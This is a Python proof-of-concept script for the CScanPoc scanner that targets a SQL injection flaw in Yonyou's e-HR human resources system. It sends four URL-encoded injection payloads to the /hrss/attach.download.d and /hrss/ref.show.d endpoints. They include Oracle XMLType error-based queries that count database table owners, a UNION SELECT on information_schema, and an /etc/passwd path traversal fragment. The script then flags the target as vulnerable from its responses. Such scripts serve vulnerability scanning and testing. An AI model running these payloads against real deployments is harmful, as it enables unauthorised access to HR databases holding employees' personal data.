# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0006'  # 平台漏洞编号，留空
    name = '用友人力资源管理（e-HR）SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-12'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友人力资源管理（e-HR）SQL注入漏洞
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=078679'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e8cbfdad-56e0-46da-b7d6-6f08f5812999'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload1 = "/hrss/attach.download.d?appName=PSNBASDOC_RM&pkAttach=null%27%20AND%206046%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28REPLACE%28REPLACE%28REPLACE%28REPLACE%28%28SELECT%20NVL%28CAST%28COUNT%28OWNER%29%20AS%20VARCHAR%284000%29%29%2CCHR%2832%29%29%20FROM%20%28SELECT%20DISTINCT%28OWNER%29%20FROM%20SYS.ALL_TABLES%29%29%2CCHR%2832%29%2CCHR%28113%29%7C%7CCHR%28108%29%7C%7CCHR%28113%29%29%2CCHR%2836%29%2CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%2CCHR%2864%29%2CCHR%28113%29%7C%7CCHR%28100%29%7C%7CCHR%28113%29%29%2CCHR%2835%29%2CCHR%28113%29%7C%7CCHR%28102%29%7C%7CCHR%28113%29%29%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27GbdE%27%3D%27GbdE"
            payload2 = "/hrss/attach.download.d?appName=PSNBASDOC_RM&pkAttach=null&Ojtt%3D8516%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2C2%2C3%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%20..%2F..%2F..%2Fetc%2Fpasswd"
            payload3 = "/hrss/ref.show.d?refcode=HI000000000000000003%27%20AND%208684%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288684%3D8684%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27FrqA%27%3D%27FrqA"
            payload4 = "/hrss/ref.show.d?refcode=HI000000000000000003%27%29%20AND%208684%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288684%3D8684%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27RJDF%27%3D%27RJDF"
            verify_url1 = '{target}'.format(target=self.target) + payload1
            verify_url2 = '{target}'.format(target=self.target) + payload2
            verify_url3 = '{target}'.format(target=self.target) + payload3
            verify_url4 = '{target}'.format(target=self.target) + payload4
            code1, head1, body, _, _ = hh.http("%s" % verify_url1)
            code2, head2, body, _, _ = hh.http("%s" % verify_url2)
            code3, head3, body, _, _ = hh.http("%s" % verify_url3)
            code4, head4, body, _, _ = hh.http("%s" % verify_url4)
            loc1 = re.search(
                'Location: (.*)', head1).group(1) if re.search('Location: (.*)', head1) else ''
            loc2 = re.search(
                'Location: (.*)', head2).group(1) if re.search('Location: (.*)', head2) else ''
            loc3 = re.search(
                'Location: (.*)', head3).group(1) if re.search('Location: (.*)', head3) else ''
            loc4 = re.search(
                'Location: (.*)', head4).group(1) if re.search('Location: (.*)', head4) else ''
            if code1 == 302 and "SQLException" in head1 and loc1 != loc2 and code2 == 302:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            if code1 == 302 and "Error" in head1 and loc1 != loc2 and code2 == 302:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
